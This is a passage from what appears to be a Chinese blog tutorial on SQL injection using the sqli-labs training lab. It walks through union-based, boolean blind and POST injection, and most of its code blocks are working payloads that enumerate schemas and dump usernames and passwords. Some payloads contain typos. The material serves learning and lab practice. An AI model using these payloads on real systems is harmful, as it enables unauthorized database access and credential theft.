class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27; =&#x27;</span><span class="number">2</span></span><br><span class="line">输入 http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>abc.php?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> 页面运行正常，继续进行下一步。</span><br><span class="line">输入 http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>abc.php?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span> 页面运行错误，则说明此 <span class="keyword">Sql</span> 注入为字符型注入。同理</span><br><span class="line"></span><br><span class="line">除了常见的单引号、双引号、括号，他们之间还有可以(<span class="string">&#x27;&#x27;</span>)(&quot;&quot;)等等组合，如sqli的第三关</span><br></pre></td></tr></table></figure><h4 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3--+    正常</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+    报错</span></span><br></pre></td></tr></table></figure><h4 id="获取显示位"><a href="#获取显示位" class="headerlink" title="获取显示位"></a>获取显示位</h4><p><code>id=-1&#39; union select 1,2,3 --+</code></p><p><code>SQL=&quot;select id,name,password from users where id=&#39;-1&#39; union select 1,2,3 &quot;</code></p><blockquote><ul><li>union select ：联合查询，连接前后两条语句，合并查询的作用</li><li>union特性：前一个sql语句的字段数，要与后一个sql语句字段数一样，因此我们使用union select 1，2，3进行获取显示位的时候，需要先判断字段数有多少位。</li><li>还有一个注意点是：设置id&#x3D;’-1’的目的是为了，不让前面的SQL&#x3D;”select name from users where id&#x3D;’-1’ “语句有输出，从而只有select 1，2，3执行</li></ul></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">version()、<span class="keyword">user</span>()、@<span class="variable">@datadir</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1, version(),3--+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, @<span class="variable">@datadir</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><hr><h4 id="一个问题：-1"><a href="#一个问题：-1" class="headerlink" title="一个问题："></a><strong>一个问题：</strong></h4><p><u><code>SELECT 1,2,3...</code>的含义及其在SQL注入中的用法：</u></p><ul><li>首先，select 之后可以接一串数字：1,2,3…只是一个例子，这串数字的值和顺序是任意的，甚至可以是重复的，如：11,465,7461，35 或11,11,11,11，数字串的长度也是任意的，我们想获得多少列的数据，就写多少个数字。</li><li>union特性：前一个sql语句的字段数，要与后一个sql语句字段数一样，因此我们使用<code>union select 1，2，3</code>进行获取显示位的时候，需要先判断字段数有多少位。</li><li>我们都知道，select语句在指明要查询的内容属性（如<code>select id</code>）后，要加from指明是从哪个数据库表中获得数据，在数据库环境中我们一般会先写一句<code>use xxxdatabase</code>，之后写<code>select from</code>语句直接加当前数据库中的表名就可以了。如果我们没有声明使用哪个数据库，也可以直接写 <code>select xxxx from security.users</code>（假设要从security数据库的users表中获取数据）。而select直接加数字串时，可以不写后面的表名，那么它输出的内容就是我们select后的数字，这时我们写的一串数字就是一个数组（或1个行向量），这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组，这时它是个1行n列的表，表的属性名和值都是我们输入的数组，如下图：</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210061540946.png" alt="image-20221006154041655"></p><ul><li><p>那么这个东西有什么用呢？在SQL注入时，我们可以利用它来进行一个快速测试，在Union注入时，如果我们通过测试已经知道了前面语句的字段数，就可以写入union 注入语句，但存在一个问题，我们虽然可以通过注入获得想要的信息，但这些信息必须能够返回到我们手中，对于网页来说，如何能够让数据回显是至关重要的。</p><p>例如 <u>一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显</u>，这个过程相当于<strong>找到数据库与前端显示的通道</strong>。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的<code>select 1,2,3</code>，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。</p></li></ul><blockquote><p>原文链接：<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">https://blog.csdn.net/weixin_44840696/article/details/89166154</a></p></blockquote><ul><li><p>select后面的内容可以时select1 1，2，3 当然也可以是某种操作或是某个函数得出来的结果，都会直接显示出来。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>, version(),<span class="number">3</span>      函数获取结果</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> database()),<span class="number">3</span>    操作获取结果</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">version()、<span class="keyword">user</span>()、@<span class="variable">@datadir</span>、database() schema()、@<span class="variable">@version</span>_compile_os</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1, version(),3--+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, @<span class="variable">@datadir</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3--+</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> database()),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="获取所有数据库"><a href="#获取所有数据库" class="headerlink" title="获取所有数据库"></a>获取所有数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span></span><br></pre></td></tr></table></figure><blockquote><p>注意schemata的表名不要写错了，</p></blockquote><h4 id="获取数据库表"><a href="#获取数据库表" class="headerlink" title="获取数据库表"></a>获取数据库表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><h4 id="获取表中所有字段"><a href="#获取表中所有字段" class="headerlink" title="获取表中所有字段"></a>获取表中所有字段</h4><blockquote><p> table_name&#x3D;’users’ and table_schema&#x3D;’security’</p><p>注意在users和security上，都要加上一对单引号表示其名字</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span>  table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,username,password from users limit 0,1--+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> users<span class="comment">--+</span></span><br><span class="line">将所有的结果串成字符串输出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#也可以使用冒号分隔数据：</span><br><span class="line">使用 group_concat(username,<span class="number">0x3a</span>,password)将用户名和密码连接成字符串，并使用：冒号将用户名和密码分隔开。</span><br><span class="line"><span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> users;</span><br><span class="line">#<span class="number">0</span>x 是十六进制的标志，<span class="number">3</span>a 即十六进制的 <span class="number">3</span>a。 <span class="number">0x3a</span> 在 ASCII 码表代表：冒号</span><br></pre></td></tr></table></figure><p>输出的数据更美观规范：在 sql 注入时加入换行符</p><p>我们可以在每一个用户名：密码后面添加一个换行符。<br>HTML 中换行符用<code>&lt;hr /&gt;</code>来表示，但是我们需要转换成十六进制 <code>0x3C,0x68,0x72,0x2F,0x3E</code></p><blockquote><p>ASCII 码表：<a href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">https://baike.baidu.com/item/ASCII/309296?fr=aladdin</a></p></blockquote><p>将十六进制的换行符添加到 password 字段后，注：password 后面必须添加一个逗号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.120/sqli-labs/Less-1/?id=-1&#x27; union select 1,group_concat(username,0x3a,password,0x3C,0x68,0x72,0x2F,0x3E),3 from users--+</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121615911.png" alt="image-20221112161512530" style="zoom:50%;" /><h2 id="GET盲注"><a href="#GET盲注" class="headerlink" title="GET盲注"></a>GET盲注</h2><blockquote><p>盲注的话，一般很少手工搞，，用工具和脚本去跑吧</p></blockquote><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><blockquote><p> sql函数</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">length(<span class="string">&#x27;name&#x27;</span>)：#函数返回字符串的长度</span><br><span class="line">mid(<span class="string">&#x27;name&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)、substr(<span class="string">&#x27;name&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)：#函数截取字符串，从第<span class="number">1</span>个字符开始截取<span class="number">1</span>个字符，mid和substr用法一致</span><br><span class="line">ascii(<span class="string">&#x27;a&#x27;</span>)、ord(<span class="string">&#x27;aadadds&#x27;</span>)：#函数返回字符的ascii码,只不过ord返回第一个字母的ascii</span><br><span class="line"><span class="keyword">left</span>(<span class="string">&#x27;name&#x27;</span>，<span class="number">2</span>)：#函数返回name的左边二个字符</span><br><span class="line"><span class="keyword">right</span>(<span class="string">&#x27;name&#x27;</span>，<span class="number">2</span>)：#函数返回name的右边二个字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> mid(database(),<span class="number">1</span>,<span class="number">1</span>)) </span><br><span class="line">#截取结果中的值，从第一个字符开始，截取<span class="number">1</span>个字符。</span><br><span class="line"><span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">#截取结果中的值，从第一个字符开始，截取<span class="number">1</span>个字符。</span><br><span class="line"><span class="keyword">select</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)); </span><br><span class="line">#将截取出来的字符，转换成ASCII码，以便于后面做运算。</span><br><span class="line"><span class="keyword">select</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">97</span>;<span class="operator">/</span><span class="operator">/</span><span class="number">97</span><span class="comment">--a</span></span><br><span class="line">#结果为<span class="number">1</span>或者<span class="number">0</span>，也就是<span class="literal">true</span> <span class="keyword">or</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">select</span> ord(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">#返回字符串第一个字符的 ASCII 值。</span><br><span class="line"><span class="keyword">left</span>(arg,length)：</span><br><span class="line">#返回arg最左边的length个字符串</span><br><span class="line"><span class="keyword">right</span>(arg,length)：</span><br><span class="line">#返回arg最右边的length个字符串</span><br><span class="line"><span class="keyword">select</span> length()</span><br><span class="line">#返回文本字段中值的长度。</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>()</span><br><span class="line">#返回匹配指定条件的行数。</span><br><span class="line">limit <span class="number">0</span>,<span class="number">1</span>：查询第<span class="number">1</span>个数        limit  <span class="number">1</span>,<span class="number">1</span>： 查询第<span class="number">2</span>个数             </span><br><span class="line">limit  n,<span class="number">1</span>： 查询第n<span class="operator">+</span><span class="number">1</span>个数</span><br></pre></td></tr></table></figure><h3 id="GET盲注基本流程"><a href="#GET盲注基本流程" class="headerlink" title="GET盲注基本流程"></a>GET盲注基本流程</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">01</span>、获取当前数据库长度</span><br><span class="line"><span class="number">02</span>、获取当前数据库名</span><br><span class="line"><span class="number">03</span>、获取当前数据库表总数</span><br><span class="line"><span class="number">04</span>、获取当前数据库表的长度</span><br><span class="line"><span class="number">05</span>、获取当前数据库表名</span><br><span class="line"><span class="number">06</span>、获取当前数据库表的字段总数</span><br><span class="line"><span class="number">07</span>、获取当前数据库表的字段第N个长度</span><br><span class="line"><span class="number">08</span>、获取当前数据库表的字段第N个字段名</span><br><span class="line"><span class="number">09</span>、获取当前数据库表的字段内容长度</span><br><span class="line"><span class="number">10</span>、获取当前数据库表的字段内容</span><br></pre></td></tr></table></figure><h3 id="注入步骤-1"><a href="#注入步骤-1" class="headerlink" title="注入步骤"></a>注入步骤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#判断：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+       id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#获取当前数据库长度：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#获取当前数据库版本：</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>(version(),<span class="number">6</span>)<span class="operator">=</span><span class="string">&#x27;5.5.53&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#获取当前数据库名：</span><br><span class="line">当前数据库第一个字符： id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ORD(mid(database(),1,1))=115 --+ </span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string">（  ascii(substr(database(),1,1))=115   ）</span></span><br><span class="line"><span class="string">（  left(database(),1)=‘s’   ）</span></span><br><span class="line"><span class="string">当前数据库第二个字符： id=1&#x27;</span> <span class="keyword">and</span> ORD(mid(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span> <span class="comment">--+ </span></span><br><span class="line">e</span><br><span class="line">（  ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>   ）</span><br><span class="line">（  <span class="keyword">left</span>(database(),<span class="number">2</span>)<span class="operator">=</span>‘se’   ）</span><br><span class="line">……</span><br><span class="line">得到当前数据库名：security</span><br><span class="line"></span><br><span class="line">#获取当前数据库表总数：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#获取当前数据库表长度：</span></span><br><span class="line"><span class="string">#第一个数据库表长度：</span></span><br><span class="line"><span class="string">id=1‘ and (select length(table_name) from information_schema.tables where table_scchema=database() limit 0,1)=6 --+</span></span><br><span class="line"><span class="string">#第二个数据库表长度：</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_scchema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">8</span> <span class="comment">--+</span></span><br><span class="line">……</span><br><span class="line">#得到四个数据库表得长度分别为：<span class="number">6</span>，<span class="number">8</span>，<span class="number">7</span>，<span class="number">5</span></span><br><span class="line"></span><br><span class="line">#获取当前数据库第一个表的第一个字符：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">(   id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span>‘e’ <span class="comment">--+   )</span></span><br><span class="line">#获取当前数据库第一个表的第二个字符：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">109</span> <span class="comment">--+</span></span><br><span class="line">(   id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>)<span class="operator">=</span>‘em’ <span class="comment">--+   )</span></span><br><span class="line">……</span><br><span class="line">#获取当前数据库第二个表的第一个字符：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span> <span class="comment">--+</span></span><br><span class="line">#获取当前数据库第二个表的第二个字符：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span> <span class="comment">--+</span></span><br><span class="line">……</span><br><span class="line">#得到所有表名：emails，referers，uagents，users</span><br><span class="line"></span><br><span class="line">#获取第一个表得字段总数：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.cloumns <span class="keyword">where</span> table_name<span class="operator">=</span>‘emails’ )<span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">#获取第二个表得字段总数：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.cloumns <span class="keyword">where</span> table_name<span class="operator">=</span>‘referers’ )<span class="operator">=</span><span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">……</span><br><span class="line">#得到四个数据表中字段数分别为：<span class="number">2</span>，<span class="number">3</span>，<span class="number">0</span>，<span class="number">3</span></span><br><span class="line"></span><br><span class="line">#获取第一个表的第一个字段名：id</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> ascii(mid(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>‘emails’ limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> asci(mid(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>‘emails’ limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">……依次类推，可得到所有表的所有字段</span><br><span class="line"></span><br><span class="line">#获取emails表字段内容长度：</span><br><span class="line">#concat  拼接内容为一个字符串</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(concat(id,&quot;-&quot;,email_id)) from emails limit 0,1)=18 --+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(concat(id,&quot;-&quot;,email_id)) <span class="keyword">from</span> emails limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">18</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#获取emails表第一列字段内容：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(mid((select concat(id,&quot;-&quot;,email_id) from emails limit 0,1),1,1))=49 --+</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string">获取emails表第二列字段内容：</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> concat(id,&quot;-&quot;,email_id) <span class="keyword">from</span> emails limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">50</span> <span class="comment">--+</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure><h3 id="布尔盲注例子"><a href="#布尔盲注例子" class="headerlink" title="布尔盲注例子"></a>布尔盲注例子</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在页面中，如果正确执行了SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面显示内容的不同，来判断SQL语句执行正确与否，从而达到获取数据的目的</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210061708528.png" alt="image-20221006170816053" style="zoom:33%;" /><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><h5 id="获取当前数据库长度"><a href="#获取当前数据库长度" class="headerlink" title="获取当前数据库长度"></a>获取当前数据库长度</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://mingy.lab/Less-8/?id=1&#x27; and length(database())=8--+</span><br></pre></td></tr></table></figure><h5 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and left((database()),1)=&#x27;s&#x27;--+</span><br><span class="line">1&#x27; and ascii(substr(database()),1,1)=115--+</span><br><span class="line">以上是两种逐一检测出数据库表名的两个函数，当无法一次猜中ascii码时，我们需要使用&lt;&gt;来进行缩小范围</span><br><span class="line">数据库名：security</span><br></pre></td></tr></table></figure><h5 id="获取当前数据库表总数"><a href="#获取当前数据库表总数" class="headerlink" title="获取当前数据库表总数"></a>获取当前数据库表总数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=4--+</span><br></pre></td></tr></table></figure><h5 id="获取数据库表的长度"><a href="#获取数据库表的长度" class="headerlink" title="获取数据库表的长度"></a>获取数据库表的长度</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个表长度</span><br><span class="line">1&#x27; and (select length(table_name) from </span><br><span class="line">information_schema.tables where table_schema=database() limit 0,1)=6--+</span><br><span class="line">第二个表长度</span><br><span class="line">1&#x27; and (select length(table_name) from </span><br><span class="line">information_schema.tables where table_schema=database() limit 1,1)=8--+</span><br></pre></td></tr></table></figure><h5 id="获取数据库表名"><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个数据库表名：emails，提供了两种方法猜字母</span><br><span class="line">1&#x27; and substr((select table_name from </span><br><span class="line">information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27;--+</span><br><span class="line">1&#x27; and ascii((select table_name from information_schema.tables </span><br><span class="line">where table_schema=database() limit 0,1))=101--+</span><br></pre></td></tr></table></figure><h5 id="获取数据库表的字段总数"><a href="#获取数据库表的字段总数" class="headerlink" title="获取数据库表的字段总数"></a>获取数据库表的字段总数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字段总数：2</span><br><span class="line">1&#x27; and (select count(column_name) from </span><br><span class="line">information_schema.columns where table_name=&#x27;emails&#x27; and </span><br><span class="line">table_schema=database())=2--+</span><br></pre></td></tr></table></figure><h5 id="获取数据库表字段长度"><a href="#获取数据库表字段长度" class="headerlink" title="获取数据库表字段长度"></a>获取数据库表字段长度</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个字段长度：2</span><br><span class="line">1&#x27; and (select length(column_name) from </span><br><span class="line">information_schema.columns where table_name=&#x27;emails&#x27; and </span><br><span class="line">table_schema=database() limit 0,1)=2--+</span><br><span class="line">第二个字段长度：8</span><br><span class="line">1&#x27; and (select length(column_name) from </span><br><span class="line">information_schema.columns where table_name=&#x27;emails&#x27; and </span><br><span class="line">table_schema=database() limit 1,1)=8--+</span><br></pre></td></tr></table></figure><h5 id="获取数据库表字段名"><a href="#获取数据库表字段名" class="headerlink" title="获取数据库表字段名"></a>获取数据库表字段名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个字段名：id</span><br><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; and </span><br><span class="line">table_schema=database() limit 0,1),1,1)=&#x27;i&#x27;--+ </span><br><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; and </span><br><span class="line">table_schema=database() limit 1,1),1,1)=&#x27;e&#x27;--+</span><br></pre></td></tr></table></figure><h5 id="获取数据库表的字段内容"><a href="#获取数据库表的字段内容" class="headerlink" title="获取数据库表的字段内容"></a>获取数据库表的字段内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一行数据内容：1Dumb@dhakkan.com</span><br><span class="line">1&#x27; and ascii(substr((select concat(id,email_id) from emails </span><br><span class="line">limit 0,1),1,1))=49--+</span><br></pre></td></tr></table></figure><h2 id="POST显错注入"><a href="#POST显错注入" class="headerlink" title="POST显错注入"></a>POST显错注入</h2><p>POST注入跟GET注入差不多，区别在于GET注入的注入位置在url中，而POST注入的注入位置在POST请求包中常见漏洞位置在注册，登陆等通过POST传输数据的地方</p><p>另外需要注意的是，post无法像GET那样在界面直接进行注入，需要通过burp抓包测试</p><blockquote><p>实验：<a href="http://hetianlab.com/expc.do?ec=ECID172.19.104.182014081415195000001">http://hetianlab.com/expc.do?ec=ECID172.19.104.182014081415195000001</a></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">判断：单引号 <span class="string">&#x27;      双引号 &quot;</span></span><br><span class="line"><span class="string">输出所有数据：1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>语句判断字段数量：</span><br><span class="line"><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> #</span><br><span class="line">联合查询：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">获取当前数据库：</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),version() #</span><br><span class="line">获取所有数据库：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(schema_name),2 from information_schema.schemata #</span></span><br><span class="line"><span class="string">获取当前数据库表名：</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> #</span><br><span class="line">获取users表所有字段：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(column_name),2 from information_schema.columns where table_name=&#x27;</span>users‘ #</span><br><span class="line">获取security.users表所有字段</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(column_name),2 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security‘ #</span><br><span class="line">获取security.users表所有字段内容：</span><br><span class="line"><span class="number">1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users #</span><br></pre></td></tr></table></figure><h3 id="例-1：LESS-11"><a href="#例-1：LESS-11" class="headerlink" title="例 1：LESS-11"></a>例 